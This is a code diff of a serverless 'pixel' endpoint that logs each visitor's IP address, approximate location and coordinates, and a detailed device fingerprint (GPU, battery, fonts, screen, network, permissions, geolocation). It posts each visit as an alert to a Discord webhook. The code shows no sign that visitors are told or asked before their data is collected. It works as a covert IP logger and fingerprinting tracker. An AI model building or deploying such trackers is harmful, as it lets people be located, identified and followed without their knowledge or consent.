@@ -1,6 +1,6 @@
 // api/alert.js — Vercel Serverless Function (CommonJS, Node 18+)
 module.exports = async (req, res) => {
-  // CORS (harmless; useful when testing)
+  // CORS (useful for local tests; harmless for pixel GET)
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -9,19 +9,48 @@ module.exports = async (req, res) => {
   const webhook = process.env.DISCORD_WEBHOOK_URL;
   if (!webhook) return res.status(500).send('Missing DISCORD_WEBHOOK_URL');
 
-  // ---- Parse basics ----
-  const ua = req.headers['user-agent'] || '';
-  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket?.remoteAddress || 'unknown';
-  const ref = req.headers['referer'] || 'none';
+  // -------- helpers --------
+  const parseUA = (ua = '') => {
+    let browser = 'Unknown';
+    if (/edg/i.test(ua)) browser = 'Edge';
+    else if (/opr|opera/i.test(ua)) browser = 'Opera';
+    else if (/firefox|fxios/i.test(ua)) browser = 'Firefox';
+    else if (/chrome|crios/i.test(ua)) browser = 'Chrome';
+    else if (/safari/i.test(ua)) browser = 'Safari';
 
-  // Vercel Geo
+    let os = 'Unknown';
+    if (/windows nt/i.test(ua)) os = 'Windows';
+    else if (/macintosh|mac os x/i.test(ua)) os = 'macOS';
+    else if (/android/i.test(ua)) os = 'Android';
+    else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
+    else if (/linux/i.test(ua)) os = 'Linux';
+
+    const device = /mobile|android|iphone|ipad|ipod/i.test(ua)
+      ? (/android/i.test(ua) ? 'Android' : (/iphone|ipad|ipod/i.test(ua) ? 'iPhone' : 'Mobile'))
+      : 'PC';
+
+    return { browser, os, device };
+  };
+
+  const oregonNow = new Intl.DateTimeFormat('en-US', {
+    timeZone: 'America/Los_Angeles',
+    dateStyle: 'short',
+    timeStyle: 'medium'
+  }).format(new Date());
+
+  // -------- basics --------
+  const ua = req.headers['user-agent'] || '';
+  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
+          || req.socket?.remoteAddress || 'unknown';
+  const refHeader = req.headers['referer'] || 'none';
+
+  // Vercel geo headers
   const city      = req.headers['x-vercel-ip-city'] || '';
   const region    = req.headers['x-vercel-ip-country-region'] || req.headers['x-vercel-ip-region'] || '';
   const country   = (req.headers['x-vercel-ip-country'] || '').toUpperCase();
   const latitude  = req.headers['x-vercel-ip-latitude'] || '';
   const longitude = req.headers['x-vercel-ip-longitude'] || '';
 
-  // Merge query + body
   const q = req.query || {};
   let body = {};
   if (req.method === 'POST') {
@@ -29,58 +58,49 @@ module.exports = async (req, res) => {
     catch { body = {}; }
   }
 
-  const path = body.path || q.path || (req.url || '');
+  // -------- merge client/server values --------
+  const uaParsed = parseUA(ua);
   const client = {
-    // core identity-ish signals
-    fpHash: body.fpHash || null,          // SHA-256 of combined signals
-    ua: ua,
-    uaCH: body.uaCH || null,              // UA-CH brands, model, platformVersion
-    browser: body.browser || 'Unknown',
-    os: body.os || 'Unknown',
-    device: body.device || 'PC',
+    // identity-ish
+    fpHash: body.fpHash || null,
+    browser: body.browser || uaParsed.browser,
+    os: body.os || uaParsed.os,
+    device: body.device || uaParsed.device,
+
     // env
-    language: body.language || (req.headers['accept-language']||'').split(',')[0] || 'unknown',
+    language: body.language || (req.headers['accept-language'] || '').split(',')[0] || 'unknown',
     languages: body.languages || null,
     timezone: body.timezone || null,
     dnt: body.dnt ?? null,
     cookiesEnabled: body.cookiesEnabled ?? null,
-    storage: body.storage || null,        // {local,session,quotaMB,usageMB}
-    screen: body.screen || null,          // {w,h,innerW,innerH,colorDepth,pixelRatio}
-    color: body.color || null,            // {gamut, scheme, contrast, motion}
-    hw: body.hw || null,                  // {cores, memoryGB}
-    gpu: body.gpu || null,                // {vendor, renderer}
-    net: body.net || null,                // {type, downlink, rtt, saveData, pingMs}
-    battery: body.battery || null,        // {charging, level}
-    media: body.media || null,            // {hasAudio, hasVideo}
-    sensors: body.sensors || null,        // {touchPoints}
-    perms: body.perms || null,            // {geolocation, notifications}
-    fontsSample: body.fontsSample || null,// font metrics hash (coarse)
-    // location (client geolocation if user allowed)
-    geo: body.geo || null,                // {lat, lon, accuracy_m}
+    storage: body.storage || null,
+    screen: body.screen || null,
+    color: body.color || null,
+    hw: body.hw || null,
+    gpu: body.gpu || null,
+    net: body.net || null,
+    battery: body.battery || null,
+    media: body.media || null,
+    sensors: body.sensors || null,
+    perms: body.perms || null,
+    fontsSample: body.fontsSample || null,
+    geo: body.geo || null,
+
     // routing
-    path,
-    ref: body.ref || q.ref || ref
+    path: (body.path || q.path || '').toString().slice(0, 512), // avoid pasting long text by accident
+    ref: body.ref || q.ref || refHeader
   };
 
-  // Oregon (Pacific) time
-  const nowOR = new Intl.DateTimeFormat('en-US', {
-    timeZone: 'America/Los_Angeles',
-    dateStyle: 'short',
-    timeStyle: 'medium'
-  }).format(new Date());
-
-  // Country flag
+  // country flag
   const flag = country ? String.fromCodePoint(...[...country].map(c => 0x1F1A5 + c.charCodeAt(0))) : '';
-
-  // Pretty location
   const approxLoc = (city || region || country)
     ? `${city ? city + ', ' : ''}${region ? region + ', ' : ''}${country}${flag ? ' ' + flag : ''}`
     : 'Unknown';
 
-  // Build Discord lines (keep under limits)
+  // -------- Discord message --------
   const lines = [
     `🆕 **New Visit**`,
-    `🕒 **Time (Oregon):** ${nowOR}`,
+    `🕒 **Time (Oregon):** ${oregonNow}`,
     `💻 **Device:** ${client.device} (${client.os})   •   🌐 **Browser:** ${client.browser}`,
     `🧩 **FP Hash:** ${client.fpHash || '—'}`,
     `📍 **Approx. Location:** ${approxLoc}${latitude && longitude ? `  (${latitude}, ${longitude})` : ''}`,
@@ -109,7 +129,6 @@ module.exports = async (req, res) => {
     body: JSON.stringify({ content: lines.join('\n') })
   });
 
-  // Pixel response for GET
   if (req.method === 'GET') return res.status(200).send('ok');
   return res.status(204).end();
 };
